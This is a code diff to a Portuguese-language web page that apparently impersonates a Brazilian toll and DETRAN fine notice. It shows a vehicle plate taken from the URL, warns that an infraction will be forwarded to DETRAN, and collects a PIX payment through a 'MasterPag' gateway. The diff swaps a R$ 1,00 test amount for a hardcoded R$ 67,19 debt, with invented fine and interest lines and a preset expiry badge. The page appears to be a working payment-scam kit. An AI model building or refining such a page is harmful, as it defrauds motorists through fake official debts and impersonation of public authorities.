@@ -239,12 +239,12 @@
                     ATENÇÃO
                 </div>
                 <p class="modal-main-text" style="text-align:left; margin-bottom:14px;">
-                    A partir de <span class="red-text" id="modalDataAmanha">07/03/2026</span> será encaminhada ao DETRAN a infração relacionada ao veículo:
+                    A partir de <span class="red-text" id="modalDataAmanha">07/03/2026</span> será encaminhada ao DETRAN a infração relacionada ao veículo: <strong id="modalVehicleName" style="color:#000;"></strong>
                 </p>
                 <!-- Caixa azul: Valor do Débito -->
                 <div style="background:#EBF5FB; border:1.5px solid #2980B9; border-radius:10px; padding:12px 16px; display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
                     <span style="color:#1A5276; font-weight:600; font-size:14px;">Valor do Débito:</span>
-                    <span style="color:#1A5276; font-weight:700; font-size:16px;" id="modalValorDebito">R$ 1,00</span>
+                    <span style="color:#1A5276; font-weight:700; font-size:16px;" id="modalValorDebito">R$ 67,19</span>
                 </div>
                 <!-- Caixa vermelha: Art. 209-A -->
                 <div style="background:#FDEDEC; border-left:4px solid #E74C3C; border-radius:6px; padding:12px 14px; margin-bottom:14px;">
@@ -323,16 +323,20 @@
                 const placaFormatada = placaUpper.length >= 4
                     ? placaUpper.slice(0, 3) + '-' + placaUpper.slice(3)
                     : placaUpper;
-                document.getElementById('modalVehicleName').textContent = '(' + placaFormatada + ')';
-                document.getElementById('qPlaca').value = placaFormatada;
+                // Modal de atenção: mostra placa formatada
+                const modalVehicleEl = document.getElementById('modalVehicleName');
+                if (modalVehicleEl) modalVehicleEl.textContent = placaFormatada;
+                // Campo 'Seus veículos'
+                const qPlacaEl = document.getElementById('qPlaca');
+                if (qPlacaEl) qPlacaEl.value = placaFormatada;
                 document.getElementById('Placa').value = placaUpper; // mantém sem hífen para uso interno
                 document.getElementById('Cliente').value = placaUpper;
-                document.getElementById('resumoPlaca').textContent = placaUpper;
-                document.getElementById('pixPlate').textContent = placaUpper;
+                document.getElementById('resumoPlaca').textContent = placaFormatada;
+                document.getElementById('pixPlate').textContent = placaFormatada;
 
                 // Atualiza a placa nos itens da lista
-                document.querySelectorAll('.item-placa').forEach(el => el.textContent = placaUpper);
-                document.querySelectorAll('.chkDebito').forEach(el => el.dataset.placa = placaUpper);
+                document.querySelectorAll('.item-placa').forEach(el => el.textContent = placaFormatada);
+                document.querySelectorAll('.chkDebito').forEach(el => el.dataset.placa = placaFormatada);
             }
             // Garante que o total seja calculado após todos os listeners estarem prontos
             setTimeout(function() {
@@ -349,7 +353,16 @@
                 if (pixTotalEl && tot > 0) {
                     pixTotalEl.textContent = tot.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL', minimumFractionDigits: 2 });
                 }
-            }, 100);
+                // Atualiza placa no campo 'Seus veículos' e no rodapé
+                const placaAtual = document.getElementById('Placa') ? document.getElementById('Placa').value : '';
+                if (placaAtual && placaAtual.length >= 4) {
+                    const placaFmt = placaAtual.slice(0, 3) + '-' + placaAtual.slice(3);
+                    const qPlacaEl = document.getElementById('qPlaca');
+                    if (qPlacaEl) qPlacaEl.value = placaFmt;
+                    const resumoPlacaEl = document.getElementById('resumoPlaca');
+                    if (resumoPlacaEl) resumoPlacaEl.textContent = placaFmt;
+                }
+            }, 150);
         });
     </script>
 
@@ -385,7 +398,7 @@
             <input type="hidden" name="Modelo" id="Modelo" />
             <input type="hidden" name="Modo" id="Modo" value="pix" />
             <input type="hidden" name="Gateway" id="Gateway" value="MasterPag" />
-            <input type="hidden" name="Ticket" id="Ticket" value="1000" />
+            <input type="hidden" name="Ticket" id="Ticket" value="6719" />
 
 
             <div class="search-wrap">
@@ -396,7 +409,7 @@
                 </label>
 
                 <div class="search">
-                    <input id="qPlaca" type="text" inputmode="latin" maxlength="7" placeholder=""
+                    <input id="qPlaca" type="text" inputmode="latin" maxlength="8" placeholder=""
                         aria-label="Buscar por placa" disabled />
                 </div>
             </div>
@@ -419,11 +432,11 @@
 
                 <li class="item">
                     <label class="row">
-                        <input type="checkbox" class="chkDebito" data-placa="3432424" data-valor="1,00"
+                        <input type="checkbox" class="chkDebito" data-placa="3432424" data-valor="67,19"
                             data-concessao="CCR Rodovias" checked />
                         <div class="item-left">
                             <span class="item-placa">3432424</span>
-                            <span class="item-dados item-dados1 blur-if-anon">06/02/2026 15:01:23</span>
+                            <span class="item-dados item-dados1 blur-if-anon" id="itemDataHora">06/02/2026 15:01:23</span>
                             <span class="item-conc">CCR Rodovias</span>
                             <span class="item-dados item-dados2 blur-if-anon"></span>
                         </div>
@@ -431,12 +444,11 @@
                             <span class="badge badge-expired" id="dataBadge">
                                 Venceu em 27/02/2026
                             </span>
-                            <span class="item-price">R$&nbsp;1,00</span>
+                            <span class="item-price">R$&nbsp;47,24</span>
                             <span class="row__fee">
-                                Multa + Juros: R$ 0,00 + R$ 0,00
+                                Multa + Juros: R$ 5,13 + R$ 14,82
                             </span>
-
-                            <span class="row__total">Total: <strong>1,00</strong></span>
+                            <span class="row__total">Total: <strong>67,19</strong></span>
                         </div>
                     </label>
                 </li>
@@ -689,20 +701,16 @@
                     return;
                 }
 
-                selecionados.forEach(chk => {
+                   selecionados.forEach(chk => {
                     const valor = parseFloat(chk.dataset.valor.replace(/\./g, "").replace(",", ".")) || 0;
                     const concessao = chk.dataset.concessao;
                     const placa = chk.dataset.placa;
-
                     total += valor;
-
                     const li = document.createElement("li");
                     li.innerHTML = `<span>${concessao}</span><strong>${formatMoney(valor)}</strong>`;
                     resumoItens.appendChild(li);
-
                     resumoPlaca.textContent = placa;
                 });
-
                 resumoTotal.textContent = formatMoney(total);
                 pixTotal.textContent = formatMoney(total);
             }
@@ -813,7 +821,8 @@
                INIT
             ====================== */
             irParaStep(1);
-            atualizarResumo();
+            // Aguarda o primeiro DOMContentLoaded atualizar a placa antes de calcular o resumo
+            setTimeout(atualizarResumo, 200);
         });
 
         function copiarPix() {
@@ -1233,7 +1242,7 @@
         // ─── Verificação ao clicar em CONTINUAR no step 3 ──────────────────────
         async function verificarPagamento() {
             const placa = _placaPagamento || new URLSearchParams(window.location.search).get('placa') || '';
-            const valor = _valorPagamento || 1.00;
+            const valor = _valorPagamento || 67.19;
 
             // Só redireciona se o Redis confirmar paid:true
             if (_chargeId) {
